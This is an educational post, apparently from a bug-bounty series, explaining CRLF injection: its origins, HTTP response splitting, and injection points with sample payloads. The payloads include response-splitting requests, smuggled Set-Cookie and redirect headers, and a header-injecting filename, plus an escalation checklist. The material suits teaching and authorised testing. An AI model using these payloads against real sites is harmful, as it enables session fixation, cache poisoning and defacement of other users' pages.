# CRLF Injection - Understanding the Vulnerability ( P 1/3 ) : 
<img width="1200" height="570" alt="Understanding the Vulnerability" src="https://github.com/user-attachments/assets/115fcfda-8068-4878-960f-52f04f65383c" />

CRLF (Carriage Return Line Feed) injection occurs when an attacker can inject CRLF sequences (%0D%0A) into web applications, leading to HTTP response splitting, header injection, and other critical attacks.

## Why Does It Exist?

The concept comes directly from physical mechanical typewriters and teletype machines. To start a completely fresh line on a typewriter, you had to perform two distinct movements: roll the cylinder to advance the paper upward (Line Feed), and slide the mechanical carriage back to the left margin (Carriage Return).Early computer systems kept these separate instructions so printers would have enough time to physically move the printer head before receiving the next letter. Microsoft systems chose to retain both characters for compatibility, while Unix-like systems streamlined the process down to just one (LF).

## 🔥 What is CRLF Injection?

CRLF = Carriage Return (\\r, %0D) + Line Feed (\\n, %0A)

These characters are used to terminate HTTP headers and lines. When an application includes user-controlled input in HTTP headers without proper sanitization, attackers can inject CRLF sequences to:

- Split HTTP responses (HTTP Response Splitting)
- Inject arbitrary headers
- Set cookies for other users
- Deface websites via XSS
- Bypass security controls
- Poison caches

## Operating System Conventions
Different operating systems handle line endings in their own way, which frequently causes formatting issues when files are shared:

| Operating System | Characters Used(Format) | Escape Sequence |
|---|---|---|
| Windows / MS-DOS | CRLF(CR + LF) | \\r\\n |
| Linux & Modern macOS | LF(LF only) | \\n |
| Classic Mac OS (Pre-OS X) | CR(CR only) | \\r |

## 🛠 How CRLF Injection Works

### Normal Request

```http
GET /redirect?url=https://example.com HTTP/1.1
Host: target.com
```

### Server Response:
```
HTTP/1.1 302 Found
Location: https://example.com
Content-Length: 0
```

### Attacker Request

```http
GET /redirect?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked!</html> HTTP/1.1
```
### Server Response (Interpreted as Two Responses):

```
HTTP/1.1 302 Found
Location: 
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 19

<html>Hacked!</html>
```

## 💡 Why CRLF Injection is Critical

- HTTP Response Splitting: Allows attackers to control the server's response
- Cache Poisoning: Malicious responses stored in caches affect other users
- XSS Bypass: Can inject `<script>` tags via headers
- Session Fixation: Set cookies for other users (e.g., `Set-Cookie: session=attacker`)
- Header Injection: Add arbitrary HTTP headers (e.g., `X-Forwarded-For: 127.0.0.1`)

## ⚡️ Common CRLF Injection Points

1. URL Parameters

```http
GET /page?redirect=http://example.com%0d%0aSet-Cookie:%20session=evil
```

2. Form Inputs

```http
POST /login
...
username=admin%0d%0aX-Forwarded-For: 127.0.0.1
```

3. HTTP Headers

```http
Referer: https://example.com%0d%0aX-Custom-Header: injected
```

4. Cookie Values

```http
Cookie: user=admin%0d%0aSet-Cookie: session=evil
```

5. File Uploads (Filename)

```http
Content-Disposition: form-data; name="file"; filename="evil.php%0d%0aContent-Type: image/jpeg"
```

## 🎯 Testing Methodology

### Step 1: Identify Input Vectors

- Look for redirects, referer handling, custom headers  
- Check URL parameters, forms, cookies, user-agent, referer


### Step 2: Inject Basic Payload

```bash
%0d%0a
%0d
%0a
%0d%0a%0d%0a
\r\n
\n
```

### Step 3: Observe Response

- Check if extra `Set-Cookie` appears
- Look for duplicate headers
- Monitor response splitting

### Step 4: Escalate Impact

- Inject `Set-Cookie: session=attacker`
- Inject `Location: https://evil.com`
- Inject `Content-Type: text/html` + XSS payload

---

🔔 Follow @cybersecplayground for Part 2: Advanced CRLF Bypass Techniques & Filter Evasion!

✅ Like & Share if you've found CRLF injection in the wild! 🔍

#CRLFInjection #HTTP #WebSecurity #BugBounty #Hacking #CyberSecurity #InfoSec #PenTesting

⚠️ Pro Tip: Test both %0d%0a and %0a%0d order—some parsers handle them differently!
  
